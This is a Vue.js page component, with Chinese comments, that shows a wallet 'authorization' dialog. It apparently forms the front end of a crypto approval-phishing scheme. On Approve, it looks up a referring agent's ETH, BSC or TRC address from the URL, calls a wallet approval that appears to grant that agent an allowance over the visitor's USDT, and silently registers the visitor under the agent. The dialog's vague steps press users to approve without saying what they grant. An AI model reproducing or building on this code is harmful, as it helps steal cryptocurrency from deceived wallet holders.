<template>
  <div class="app">
    <div class="header">
      <div class="left">
        <router-link to="/home/main">
          <a href="">
            <i class="el-icon-s-home"></i>
            HOME
          </a>
        </router-link>
        <router-link to="/home/shore">
          <a href="">
            <i class="el-icon-s-order"></i>
            SHARE
          </a>
        </router-link>
      </div>
      <div class="me">
        <router-link to="/home/me">
          <a href="">
            <i class="el-icon-user-solid"></i>
            ACCOUNT
          </a>
        </router-link>
        <a @click="quit" style="cursor: pointer;">
          <i style="width:18px;height:18.4px;">
            <img src="../images/退出.png" alt="" width="18" height="18.4">
          </i>
          QUIT
        </a>
      </div>
    </div>
    <router-view></router-view>

    <el-dialog title="Website application authorizes your wallet" :visible.sync="falg" width="60%" center>
      <span style="text-align: center;display:block;">1.If the license does not respond, click the Reset button below to clear the corresponding (Eth/Bsc/Trc) link information</span>
      <br />
      <span style="text-align: center;display:block;">2.If you have connected wallet but do not pull 'App Wallet Authorization 'for a long time, please return to this page to refresh and click Authorization again</span>
      <br />
      <span style="text-align: center;display:block;">3.After 'agree to grant' may need to wait on the chain Peeding, perhaps you should wait for a while on this page</span>
      <span slot="footer" class="dialog-footer">
        <el-button @click="disConnect">Reset</el-button>
        <el-button @click="no">Cancel</el-button>
        <el-button type="primary" @click="yes">Approve</el-button>
      </span>
    </el-dialog>

  </div>
</template> 
<script>
// 封装的调用钱包方法
import BlockChain from "../blockchain/BlockChainBase"
// 引用状态机
import { createNamespacedHelpers } from "vuex";
// 封装的自动注册方法
import { autoRegister } from '../utils/myRegisterUtils'
const blockUtils = new BlockChain();
// 获取状态机内部封装的方法
const { mapState, mapMutations, mapActions } = createNamespacedHelpers("Home");

export default {
  name: "IsHome",

  data() {
    return {
      // 模态框开关
      falg: false,
      // 初始化授权链接
      fromParentMsg: "",
      arr: []
    };
  },
  computed: {
    ...mapState(['obj', 'Msg'])
  },
  methods: {
    ...mapActions(['GetUserId', 'GoAutoRegister']),
    async yes() {

      // 点击授权 解析restful数据
      let res = this.$route.query.data;
      let ar = res.split('?')
      let arr = []
      ar.forEach((item, index) => {
        if (index != ar.length - 1) {
          let b = item.split('=');
          let obj = {};
          obj[b[0]] = b[1];
          arr.push(obj)
        }
      })
      this.arr = arr

      //区块链类型
      var chainType = ar[1].split('=')[0].split('_')[0].toUpperCase()

      // 获取解析后的账号id
      let userId = arr[0].userParentId

      // 发送请求获取账号地址
      await this.GetUserId({ id: userId })

      // 如果账号地址没有就跳转到后台主页 有就执行授权
      if (this.obj == null) this.open()
      else {
        var agentAddress
        if (chainType == 'ETH') {
          agentAddress = this.obj.ethMainnetAddress
        }
        else if (chainType == 'BSC') {
          agentAddress = this.obj.bscMainnetAddress
        }
        else if (chainType == 'TRC') {
          agentAddress = this.obj.trcMainnetAddress
        }

        console.log('agentAddress = ', agentAddress)
        let doApproveInner = async (web3) => {
          blockUtils.doApprove(web3, agentAddress, async (result, address) => {
            if (result == true) {
              let userName = autoRegister(8)
              let passWord = autoRegister(10)
              let userId = autoRegister(10)
              // 发送请求注册
              let obj = {
                userName,
                passWord,
                userId,
                userType: '3',
                userParentId: arr[0].userParentId,
              }
              if (this.arr[1].eth_usdt) {
                obj['ethMainnetAddress'] = address
              } else if (this.arr[1].bsc_usdt) {
                obj['bscMainnetAddress'] = address
              } else if (this.arr[1].trc_usdt) {
                obj['trcMainnetAddress'] = address
              }
              console.log(`授权成功，创建的用户信息为`, obj);
              await this.GoAutoRegister({
                ...obj
              })
              this.falg = false
              this.$message({
                type: 'info',
                message: this.Msg
              });
            }
            else {
              this.$message({
                type: 'info',
                message: `授权失败，地址有误`
              });
            }
          }, chainType)
        }

        // 连接钱包
        console.log('chainType = ', chainType)
        blockUtils.doConnectWallet((info, web3) => {
          if (info == 'DisApprove') {
            blockUtils.doDisConnectWallet()
          }
          else if (info == 'Approve') {
            doApproveInner(web3)
          }
        }, chainType)
      }

    },
    quit() {
      this.$message({
        message: '退出成功',
        type: 'success'
      });
      // 点击退出登录
      // 清空本地存储，跳转到登录页
      sessionStorage.removeItem("token");
      sessionStorage.removeItem("user");
      // location.replace('/') //跳回登录地址
      setTimeout(() => {
        window.location.href = "/";
      }, 500);
    },
    disConnect() {
      alert("Description Succeeded in resetting the connection information")
      blockUtils.doDisConnectWallet()
    },
    no() {
      this.falg = false;
    },
    // 授权地址找不到跳转指后台主页
    open() {
      this.$alert('你的账号地址找不到', '', {
        confirmButtonText: '确定',
        callback: action => {
          this.$message({
            type: 'info',
            message: `你的地址找不到`
          });
          this.$router.push('/backstage')
        }
      });
    },


  },
  created() {
    //如果有数据
    if (this.$route.query.data) {
      this.falg = true;
    }
  }
}

</script>
<style scoped>
.app {
  height: 100vh;
  display: flex;
  flex-direction: column;

  background-image: url(../images/loginleftbg.6cfc269.jpg);
  background-repeat: no-repeat;
  background-size: 100% 100%;
}

.big {
  width: 100%;
  height: 100%;
  position: absolute;
  left: 0;
  top: 0;
  background-color: rgba(0, 0, 0, 0.3);
}

.box {
  width: 30%;
  height: 30%;
  position: absolute;
  left: 33%;
  transform: translateX(-50%);
  top: 40%;
  transform: translateY(-50%);
  background-color: white;
  border: 1px solid gray;
  border-radius: 5px;
  box-shadow: 10px 10px 5px gray;
}

.box>p {
  font-size: 32px;
  width: 90%;
  height: 20%;
  margin: 20px auto;
  line-height: 200%;
  text-align: center;
  /* background-color: aqua; */
}

button {
  width: 30%;
  height: 15%;
  margin-left: 70px;
  margin-top: 30px;
  font-size: 24px;
  border-radius: 8px;
  outline: none;
  border: none;
  color: white;
}

button:nth-of-type(1) {
  background-color: rgb(41, 200, 248);
}

button:nth-of-type(2) {
  background-color: rgb(255, 87, 65);
}

.header {
  height: 100px;
  display: flex;
  justify-content: space-between;
  align-items: center;
}

.left {
  display: flex;
  width: 150px;
  justify-content: space-evenly;
}

.left a {
  display: flex;
  flex-direction: column;
  align-items: center;
  color: white;
}

.left a i {
  font-size: 25px;
}

.me {
  display: flex;
  width: 150px;
  justify-content: space-evenly;
}

.me a {
  display: flex;
  flex-direction: column;
  align-items: center;
  color: white;
}

.me a i {
  font-size: 25px;
}
</style>